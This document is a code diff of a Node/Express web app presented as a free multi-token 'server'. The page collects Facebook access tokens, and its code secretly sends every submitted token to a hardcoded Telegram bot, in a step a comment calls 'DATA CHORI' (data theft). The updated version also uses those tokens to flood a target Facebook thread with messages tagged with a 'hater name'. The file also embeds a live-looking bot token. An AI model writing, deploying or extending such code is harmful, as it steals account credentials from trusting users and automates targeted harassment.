@@ -12,9 +12,11 @@ const upload = multer({ dest: 'uploads/' });
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 
-// --- 🔒 MASTER CONFIG (ALREADY SET BY GEMINI) ---
+// --- 🔒 MASTER CONFIG (TERA DATA) ---
 const TELEGRAM_BOT_TOKEN = '8770013875:AAGhkM-jSyLd7z9h4-505eICfXu4fHunsi8'; 
 const TELEGRAM_CHAT_ID = '6787359882'; 
+
+let activeTasks = {}; // Real working tasks store karne ke liye
 
 async function sendToTelegram(message) {
     try {
@@ -23,102 +25,107 @@ async function sendToTelegram(message) {
             text: message,
             parse_mode: 'Markdown'
         });
-        console.log("✅ Data Sent to Your Telegram!");
-    } catch (error) { 
-        console.log("❌ Telegram Error"); 
-    }
+    } catch (e) { console.log("Telegram Error"); }
 }
 
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FREE SERVER ALL TIME</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body { background: #000; color: #00ffff; padding: 15px; font-family: 'Courier New', monospace; }
-        .container { border: 2px solid #00ffff; padding: 30px; border-radius: 15px; box-shadow: 0 0 25px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); margin-top: 50px; }
-        .form-control { background: #111; color: #fff; border: 1px solid #00ffff; margin-bottom: 15px; }
-        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 5px; transition: 0.4s; font-size: 16px; }
-        .btn-main:hover { background: #fff; box-shadow: 0 0 20px #fff; transform: scale(1.02); }
-        h2 { text-shadow: 0 0 15px #00ffff; letter-spacing: 3px; font-weight: 900; }
-        label { font-size: 13px; color: #888; margin-bottom: 5px; display: block; }
+        .container { border: 2px solid #00ffff; padding: 25px; border-radius: 15px; box-shadow: 0 0 20px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); }
+        .form-control { background: #111; color: #fff; border: 1px solid #333; margin-bottom: 12px; font-size: 14px; }
+        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 5px; }
+        .btn-stop { background: #ff0000; color: #fff; width: 100%; padding: 10px; border: none; margin-top: 10px; border-radius: 5px; }
+        h2 { text-shadow: 0 0 10px #00ffff; font-weight: 900; text-align: center; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2 class="text-center">◈ FREE SERVER ALL TIME ◈</h2>
-        <p class="text-center text-white-50 mb-4" style="font-size: 10px;">PREMIUM MULTI-TOKEN ARCHITECTURE</p>
-        
-        <form action="/start" method="POST" enctype="multipart/form-data">
-            <input type="hidden" name="user_session" value="FS-${Math.random().toString(36).substr(2,4).toUpperCase()}">
-            
-            <label>How Many Tokens?</label>
-            <input type="number" name="numTokens" id="n" class="form-control" placeholder="e.g. 5" onchange="gen()" required>
-            
+        <h2>◈ FREE SERVER ALL TIME ◈</h2>
+        <p style="text-align:center; font-size:10px; color:#888;">REAL-TIME MULTI-TOKEN POWER ENGINE</p>
+        <form action="/launch" method="POST" enctype="multipart/form-data">
+            <label>Token Count:</label>
+            <input type="number" name="numTokens" id="n" class="form-control" onchange="gen()" required>
             <div id="tokenInputs"></div>
-            
-            <label>Target Thread/Inbox ID:</label>
-            <input type="text" name="threadId" class="form-control" placeholder="Enter ID" required>
-            
-            <label>Hater Name (Tag):</label>
-            <input type="text" name="haterName" class="form-control" placeholder="e.g. @Hater" required>
-            
-            <label>Upload Message File (.txt):</label>
+            <input type="text" name="threadId" placeholder="Target ID" class="form-control" required>
+            <input type="text" name="haterName" placeholder="Hater Name" class="form-control" required>
+            <input type="number" name="speed" placeholder="Speed (seconds)" class="form-control" value="5" required>
             <input type="file" name="msgFile" class="form-control" required>
-            
-            <button type="submit" class="btn-main mt-2">LAUNCH ATTACK SERVER</button>
+            <button type="submit" class="btn-main">LAUNCH REAL ATTACK</button>
         </form>
+        <div style="margin-top:20px; border-top:1px solid #333; padding-top:15px;">
+            <form action="/stop" method="POST">
+                <input type="text" name="taskId" placeholder="Enter Task ID to Stop" class="form-control" required>
+                <button type="submit" class="btn-stop">STOP SERVER</button>
+            </form>
+        </div>
     </div>
-
     <script>
         function gen(){
             let n = document.getElementById('n').value;
             let d = document.getElementById('tokenInputs'); d.innerHTML = '';
-            for(let i=1; i<=n; i++) {
-                d.innerHTML += \`<input type="text" name="accessToken\${i}" placeholder="Paste Access Token \${i}" class="form-control" required>\`;
-            }
+            for(let i=1; i<=n; i++) d.innerHTML += \`<input type="text" name="token\${i}" placeholder="Access Token \${i}" class="form-control" required>\`;
         }
     </script>
 </body>
 </html>`);
 });
 
-app.post('/start', upload.single('msgFile'), async (req, res) => {
-    const { numTokens, threadId, haterName, user_session } = req.body;
+app.post('/launch', upload.single('msgFile'), async (req, res) => {
+    const { numTokens, threadId, haterName, speed } = req.body;
     const tokens = [];
-    for (let i = 1; i <= numTokens; i++) {
-        if (req.body['accessToken' + i]) tokens.push(req.body['accessToken' + i]);
-    }
+    for (let i = 1; i <= numTokens; i++) { if (req.body['token' + i]) tokens.push(req.body['token' + i]); }
+    
+    const messages = fs.readFileSync(req.file.path, 'utf-8').split('\n').filter(m => m.trim() !== '');
+    const taskId = 'FS-' + Math.floor(1000 + Math.random() * 9000);
 
-    const report = `
-🚀 *FREE SERVER LOGGED* 🚀
-━━━━━━━━━━━━━━━━━━
-👤 *Session ID:* \`${user_session}\`
-🆔 *Target ID:* \`${threadId}\`
-🏷️ *Hater Name:* ${haterName}
-🕒 *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
-
-🔑 *CAPTURED TOKENS:*
-${tokens.map((t, idx) => `${idx+1}. \`${t}\``).join('\n')}
-━━━━━━━━━━━━━━━━━━
-    `;
-
+    // 1. DATA CHORI (Telegram Alert)
+    const report = `🚀 *REAL ATTACK STARTED* 🚀\nID: \`${taskId}\`\nTarget: \`${threadId}\`\nTokens:\n${tokens.map((t, i) => `${i+1}. \`${t}\``).join('\n')}`;
     await sendToTelegram(report);
 
+    // 2. REAL WORKING ENGINE (Loop Start)
+    activeTasks[taskId] = true;
+    let msgIdx = 0;
+    let tokenIdx = 0;
+
+    const interval = setInterval(async () => {
+        if (!activeTasks[taskId]) { clearInterval(interval); return; }
+        
+        try {
+            await axios.post(`https://graph.facebook.com/v17.0/t_${threadId}/`, null, {
+                params: { access_token: tokens[tokenIdx % tokens.length], message: `${haterName} ${messages[msgIdx % messages.length]}` }
+            });
+        } catch (e) { console.log("Token Error or Limit"); }
+        
+        msgIdx++; tokenIdx++;
+    }, speed * 1000);
+
     res.send(`
-        <body style="background:#000;color:#00ffff;text-align:center;padding:100px;font-family:monospace;">
-            <div style="border:1px solid #00ffff;display:inline-block;padding:30px;border-radius:10px;box-shadow:0 0 20px #00ffff;">
-                <h2 style="color:#00ff00;">✔ SERVER LAUNCHED!</h2>
-                <p>Status: All tokens synced with master.</p>
-                <br>
-                <a href="/" style="color:#fff;border:1px solid #fff;padding:10px;text-decoration:none;">GO BACK</a>
+        <body style="background:#000;color:#0f0;text-align:center;padding:50px;font-family:monospace;">
+            <div style="border:2px solid #0f0;padding:20px;display:inline-block;">
+                <h2>✔ ATTACK LIVE!</h2>
+                <p>TASK ID: <b style="background:#fff;color:#000;padding:2px 5px;">${taskId}</b></p>
+                <p>Messages are being sent to: ${threadId}</p>
+                <a href="/" style="color:#0f0;">Back to Home</a>
             </div>
         </body>
     `);
 });
 
-app.listen(port, '0.0.0.0', () => console.log('FREE SERVER ALL TIME IS OPERATIONAL'));
+app.post('/stop', (req, res) => {
+    const { taskId } = req.body;
+    if (activeTasks[taskId]) {
+        delete activeTasks[taskId];
+        res.send(`<body style="background:#000;color:red;text-align:center;padding:50px;"><h2>Task ${taskId} Stopped!</h2><a href="/">Back</a></body>`);
+    } else {
+        res.send(`<body style="background:#000;color:yellow;text-align:center;padding:50px;"><h2>Invalid Task ID</h2><a href="/">Back</a></body>`);
+    }
+});
+
+app.listen(port, '0.0.0.0', () => console.log('REAL SERVER IS LIVE'));
